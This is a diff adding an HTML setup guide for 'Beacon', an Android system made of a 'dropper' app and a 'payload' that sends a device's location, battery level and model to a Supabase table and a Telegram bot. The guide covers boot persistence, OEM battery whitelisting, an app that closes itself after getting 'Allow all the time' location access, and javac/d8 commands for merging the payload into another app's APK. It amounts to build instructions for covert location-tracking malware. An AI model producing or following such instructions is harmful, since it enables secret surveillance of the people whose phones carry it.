@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Beacon Setup Guide — Offline</title>
+<style>
+  body{font:15px/1.6 Georgia,serif;max-width:900px;margin:0 auto;padding:24px;color:#222}
+  h1{border-bottom:3px solid #333;padding-bottom:8px}
+  h2{margin-top:40px;color:#111;border-left:5px solid #444;padding-left:12px}
+  h3{margin-top:28px;color:#333}
+  pre{background:#f4f4f4;border:1px solid #ddd;border-radius:6px;padding:12px;
+      overflow-x:auto;font:13px Consolas,monospace}
+  code{background:#eee;padding:2px 5px;border-radius:3px;font:13px Consolas,monospace}
+  table{border-collapse:collapse;width:100%;margin:16px 0}
+  th,td{border:1px solid #bbb;padding:8px 12px;text-align:left;vertical-align:top}
+  th{background:#eee}
+  .warn{background:#fff3cd;border:1px solid #ffec99;border-radius:6px;padding:10px 14px;margin:14px 0}
+  .ok{background:#d3f9d8;border:1px solid #b2f2bb;border-radius:6px;padding:10px 14px;margin:14px 0}
+  .step{background:#e7f5ff;border-left:4px solid #1971c2;padding:8px 14px;margin:14px 0;font-weight:bold}
+  details{margin:10px 0}
+  summary{cursor:pointer;font-weight:bold;color:#1971c2}
+</style>
+</head>
+<body>
+
+<h1>Beacon Setup Guide — Offline</h1>
+<p>This guide walks the full build end-to-end: Supabase project → dropper app →
+payload → dashboard. Every step links to the file it uses. Save this file, open it
+in any browser — it works with no internet.</p>
+
+<h2>0. What you need</h2>
+<ul>
+  <li>Android Studio (includes SDK 34 and platform-tools)</li>
+  <li>A Supabase account — <code>supabase.com</code> — free tier is enough</li>
+  <li>A test device (real hardware — <code>getLastKnownLocation</code> is
+      unreliable in emulators)</li>
+  <li>Supabase project ref + anon key (you create these in step 1)</li>
+</ul>
+
+<div class="warn"><b>Before you start:</b> the payload Beacon.java has
+<b>two placeholders</b> you must fill before compiling:
+<code>SB_URL</code> and <code>SB_KEY</code>. You get both in step 1.</div>
+
+<h2>1. Supabase project</h2>
+
+<div class="step">Step 1.1 — create the project</div>
+<ol>
+  <li>Sign in at <code>supabase.com</code> → New Project</li>
+  <li>Name it anything, choose a region close to you, set a DB password</li>
+  <li>Wait for provisioning (~2 min)</li>
+  <li>Once inside, go to <b>Project Settings → API</b></li>
+  <li>Note down:
+    <ul>
+      <li><b>Project URL</b> — e.g. <code>https://abcdefgh.supabase.co</code> —
+          this is your <code>SB_URL</code></li>
+      <li><b>anon public</b> key — the long <code>eyJ…</code> string —
+          this is your <code>SB_KEY</code></li>
+    </ul>
+  </li>
+</ol>
+
+<div class="step">Step 1.2 — create the table</div>
+<ol>
+  <li>Supabase dashboard → <b>SQL Editor</b> → New Query</li>
+  <li>Paste the contents of <code>schema.sql</code> (File 7 above)</li>
+  <li>Run — you should see <code>beacons</code> appear under Table Editor</li>
+</ol>
+
+<div class="ok"><b>Check:</b> Table Editor → <code>beacons</code> → columns
+<code>id, ts, lat, lon, sdk, batt, model</code>. If any column is missing,
+re-run the SQL.</div>
+
+<h2>2. Telegram push (optional)</h2>
+<p>Skippable. If you skip, use the dashboard to see results instead.</p>
+
+<div class="step">Step 2.1 — create a bot</div>
+<ol>
+  <li>In Telegram, message <code>@BotFather</code> → <code>/newbot</code> →
+      follow prompts</li>
+  <li>BotFather gives a <b>bot token</b> — e.g. <code>123456:AA…</code></li>
+  <li>Message your new bot once (any text) so it can message you back</li>
+  <li>Open <code>https://api.telegram.org/bot&lt;TOKEN&gt;/getUpdates</code> in a
+      browser → find <code>chat.id</code> in the JSON — this is your
+      <code>TG_CHAT</code></li>
+</ol>
+
+<div class="step">Step 2.2 — create the Edge Function</div>
+<ol>
+  <li>Supabase dashboard → <b>Edge Functions</b> → Create Function → name it
+      <code>push</code></li>
+  <li>Paste the contents of <code>supabase/functions/push/index.ts</code>
+      (File 8 above)</li>
+  <li>Deploy</li>
+  <li>Supabase dashboard → Edge Functions → <code>push</code> →
+      <b>Settings → Secrets</b> → add:
+    <ul>
+      <li><code>TG_TOKEN</code> — the bot token from BotFather</li>
+      <li><code>TG_CHAT</code> — the chat.id from getUpdates</li>
+    </ul>
+  </li>
+  <li>Edge Functions → <code>push</code> → <b>Webhooks</b> → connect it to
+      <b>Insert on table <code>beacons</code></b></li>
+</ol>
+
+<div class="ok"><b>Check:</b> Table Editor → insert any row manually into
+<code>beacons</code> → your bot should message you within a second.</div>
+
+<h2>3. Dropper app</h2>
+
+<div class="step">Step 3.1 — create the project</div>
+<ol>
+  <li>Android Studio → New Project → <b>Empty Views Activity</b> →
+      language <b>Kotlin</b>, min SDK <b>26</b></li>
+  <li>Application name anything, package name anything — the manifest and
+      <code>build.gradle</code> must agree with what you choose</li>
+</ol>
+
+<div class="step">Step 3.2 — add the files</div>
+<ol>
+  <li>Replace <code>AndroidManifest.xml</code> (File 1)</li>
+  <li>Replace <code>app/build.gradle</code> (File 2)</li>
+  <li>Add <code>MainActivity.kt</code> (File 4) — replace the generated one</li>
+  <li>Add <code>BeaconWorker.kt</code> (File 5)</li>
+  <li>Add <code>BeaconService.kt</code> (File 6a)</li>
+  <li>Add <code>BootReceiver.kt</code> (File 6b)</li>
+</ol>
+
+<div class="step">Step 3.3 — compile</div>
+<ol>
+  <li>Build → Make Project</li>
+  <li>Fix any Kotlin/manifest compile errors (usually a missing import)</li>
+  <li>The APK appears under <code>app/build/outputs/apk/debug/</code></li>
+</ol>
+
+<h2>4. Payload</h2>
+
+<div class="step">Step 4.1 — fill the placeholders</div>
+<ol>
+  <li>Open <code>Beacon.java</code> (File 3)</li>
+  <li>Set <code>SB_URL</code> to your Supabase Project URL from step 1.1</li>
+  <li>Set <code>SB_KEY</code> to your anon public key from step 1.1</li>
+</ol>
+
+<div class="step">Step 4.2 — two ways to build</div>
+<details open>
+<summary>Option A — drop it into the dropper project</summary>
+<ol>
+  <li>Copy <code>Beacon.java</code> into
+      <code>app/src/main/java/com/benign/notes/</code></li>
+  <li>Rebuild — done. Simplest path.</li>
+</ol>
+</details>
+<details>
+<summary>Option B — compile standalone via javac against android.jar</summary>
+<pre>javac -cp $ANDROID_HOME/platforms/android-34/android.jar \
+      -d out Beacon.java
+
+d8 --output payload-dex out/com/benign/notes/Beacon.class</pre>
+<p>Use Option B if you're repackaging into an existing app. The
+<code>payload-dex</code> can be merged into another APK's dex.</p>
+</details>
+
+<h2>5. Test on device</h2>
+
+<div class="step">Step 5.1 — install and grant</div>
+<ol>
+  <li>Enable <b>Developer Options</b> + <b>USB debugging</b> on the test device</li>
+  <li>Install via <code>adb install app-debug.apk</code>, or copy to device and
+      sideload</li>
+  <li>Open the app → the interactive permission dialog appears → <b>Allow
+      location</b></li>
+  <li>Android 10+ → the background-location settings deep-link opens →
+      <b>Allow all the time</b></li>
+  <li>The app closes itself — that's expected. The beacon already fired once.</li>
+</ol>
+
+<div class="ok"><b>Check:</b> Supabase → Table Editor → <code>beacons</code> →
+a new row with your device's <code>model</code>, <code>ts</code> = now, and
+<code>lat/lon</code> filled (if the device has a location cache). If
+<code>lat/lon</code> are <code>null</code>, the cache was empty — the worker will
+get a fresh fix on the next 15-min cycle.</div>
+
+<div class="step">Step 5.2 — verify persistence</div>
+<ol>
+  <li>Reboot the device</li>
+  <li>Wait ≥ 15 min</li>
+  <li>Refresh Table Editor → another row should appear (from BootReceiver →
+      WorkManager)</li>
+</ol>
+
+<h2>6. Dashboard</h2>
+<div class="step">Step 6.1 — set it up</div>
+<ol>
+  <li>Open <code>dashboard.html</code> (File 9)</li>
+  <li>Replace <code>SUPABASE_URL</code> and <code>SUPABASE_KEY</code> with your
+      values from step 1.1</li>
+  <li>Replace <code>DEVICE_ID</code> with your device's ANDROID_ID to filter —
+      or leave <code>null</code> to show all devices</li>
+  <li>Open the file in any browser (double-click works — it's static)</li>
+</ol>
+
+<div class="ok"><b>Check:</b> the map centers on your device's last fix, a red
+marker marks the newest row, and the info panel updates every 30 s.</div>
+
+<h2>7. Troubleshooting</h2>
+
+<table>
+  <tr><th>Symptom</th><th>Most likely cause</th><th>Fix</th></tr>
+  <tr><td>Table has no rows after install</td>
+      <td>Location permission not granted</td>
+      <td>Settings → Apps → your app → Permissions → Location →
+          <b>Allow all the time</b>. Then open the app again to re-fire.</td></tr>
+  <tr><td>Row appears but <code>lat/lon</code> are null</td>
+      <td>Empty location cache + no fresh fix yet</td>
+      <td>Open Google Maps on the device once (warms the cache), or wait for the
+          next 15-min WorkManager cycle.</td></tr>
+  <tr><td>Nothing after reboot</td>
+      <td>BootReceiver didn't fire</td>
+      <td>Check the manifest has
+          <code>RECEIVE_BOOT_COMPLETED</code> and the receiver is declared.
+          Some OEMs (Xiaomi, Oppo) require
+          <b>Auto-start</b> enabled in Settings → battery / app info.</td></tr>
+  <tr><td>Rows stopped after some time</td>
+      <td>WorkManager pruned by the OEM</td>
+      <td>Same fix — Auto-start / battery-optimization whitelist. Test on a
+          stock Android device (Pixel) first to confirm the code works, then
+          debug the OEM.</td></tr>
+  <tr><td>Telegram bot silent</td>
+      <td>Edge function or secrets misconfigured</td>
+      <li>Check Edge Functions → <code>push</code> → Logs for errors.</li>
+      <li>Verify <code>TG_TOKEN</code> and <code>TG_CHAT</code> secrets are set
+          exactly (no quotes around values).</li>
+      <li>Verify the webhook is bound to <b>Insert on <code>beacons</code></b>,
+          not Update.</li></tr>
+  <tr><td>Telegram sends a 401</td>
+      <td>Bot token wrong or bot never messaged</td>
+      <td>Re-check the token from BotFather. Also message the bot once from your
+          account — Telegram blocks bots from starting the conversation.</td></tr>
+  <tr><td>Dashboard shows "no beacons yet"</td>
+      <td>Wrong DEVICE_ID filter</td>
+      <td>Set <code>DEVICE_ID = null</code> to show every device, confirm rows
+          appear, then re-add the filter with the correct ANDROID_ID.</td></tr>
+  <tr><td>Dashboard map is empty even with rows</td>
+      <td><code>lat/lon</code> null in all rows</td>
+      <td>Same fix as above — warm the device's location cache.</td></tr>
+  <tr><td>Compile error in Beacon.java</td>
+      <td>Missing import or wrong package</td>
+      <td>The file is self-contained — check the
+          <code>package com.benign.notes;</code> line matches your project's
+          package path.</td></tr>
+  <tr><td>WorkManager cycles never run</td>
+      <td>Battery optimization killing the app</td>
+      <td>Settings → Apps → your app → Battery →
+          <b>Unrestricted</b>.</td></tr>
+  <tr><td>Supabase insert returns 403</td>
+      <td>RLS policy missing</td>
+      <td>Re-run <code>schema.sql</code> — the
+          <code>anon insert</code> policy must exist. Check under
+          Authentication → Policies → <code>beacons</code>.</td></tr>
+</table>
+
+<h3>Device-dependent gotchas</h3>
+<ul>
+  <li><b>Android 9 and below</b> — background location is implied by
+      foreground; no deep-link. Everything else works.</li>
+  <li><b>Android 10–11</b> — background location must be granted via the
+      settings deep-link, the runtime dialog is not enough.</li>
+  <li><b>Android 12+</b> — precise location can be denied while coarse is
+      granted. Check both. WorkManager can also be pruned more aggressively;
+      test with the app in the foreground once.</li>
+  <li><b>OEM battery managers</b> (Xiaomi MIUI, Samsung, Oppo/Realme) — the
+      biggest source of "it worked yesterday" issues. Whitelist the app in
+      Auto-start and battery settings, or confirm on a Pixel first.</li>
+</ul>
+
+<div class="ok"><b>End-to-end checklist:</b>
+Supabase table exists ✓ · Edge function deployed + secrets set ✓ ·
+Beacon.java placeholders filled ✓ · APK builds ✓ ·
+Interactive permission granted ✓ · First row in Table Editor ✓ ·
+Row after reboot + 15 min ✓ · Telegram message on insert ✓ ·
+Dashboard marker on map ✓</div>
+
+</body>
+</html>
